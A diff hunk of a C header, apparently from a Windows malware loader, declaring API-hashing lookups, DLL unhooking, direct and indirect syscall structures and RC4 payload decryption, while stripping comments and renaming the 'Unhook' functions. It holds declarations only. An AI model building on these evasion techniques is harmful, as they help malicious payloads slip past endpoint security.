@@ -55,28 +55,28 @@ HMODULE GetModuleHandleH(DWORD dwModuleHash);
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
 HMODULE LoadLibraryH(LPSTR DllName);
 
-BOOL IniUnhookDirectCalls();
-BOOL IniUnhookIndirectSyscalls();
+BOOL IniDirectCalls();
+BOOL IniIndirectSyscalls();
 BOOL RefreshAllDlls();
 
 BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
 
 typedef struct _NT_SYSCALL
 {
-	DWORD dwSSn;                    // syscall number
-	DWORD dwSyscallHash;            // syscall hash value
-	PVOID pSyscallAddress;          // syscall address
-	PVOID pSyscallInstAddress;      // address of a random 'syscall' instruction in ntdll
+	DWORD dwSSn;
+	DWORD dwSyscallHash;
+	PVOID pSyscallAddress;
+	PVOID pSyscallInstAddress;
 
 }NT_SYSCALL, * PNT_SYSCALL;
 
 typedef struct _NTDLL_CONFIG
 {
-	PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions
-	PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions
-	PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions
-	DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll
-	ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs
+	PDWORD      pdwArrayOfAddresses;
+	PDWORD      pdwArrayOfNames;
+	PWORD       pwArrayOfOrdinals;
+	DWORD       dwNumberOfNames;
+	ULONG_PTR   uModule;
 
 }NTDLL_CONFIG, * PNTDLL_CONFIG;
 
